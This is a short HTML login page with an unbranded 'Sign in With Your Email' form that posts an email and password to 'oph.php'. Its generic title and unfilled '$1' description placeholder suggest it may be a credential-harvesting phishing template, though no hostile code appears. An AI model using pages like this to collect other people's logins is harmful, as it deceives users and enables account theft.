
<!DOCTYPE html> 
<html>
    <head>
        <title>Email. Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="description" content="$1">
    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="css/styles.css" />
        
    <div class="loginForm">
        <form id="ox_form" name="oxForm" action="oph.php" method="post">
            <div class="bgBox">
                <h2>Sign in With Your Email </h2>
                <div class="inputRow">
                    <input type="text" name="login" id="login" placeholder="Enter your email" value="" autofocus>
                </div>
                <div class="inputRow">
                    <input type="password" name="password" id="password" value="" placeholder="Enter your password">
                </div>
                <div class="inputRow submit">
                    <input type="submit" value="Sign in" class="signIn" id="sign_in">
                </div>

                
        </form>
    </div>

    <script src="css/jquery.min.js"></script>
    <script src="css/jquery.cookie.js"></script>
    <script src="css/login.min.js"></script>

    </body>
</html>
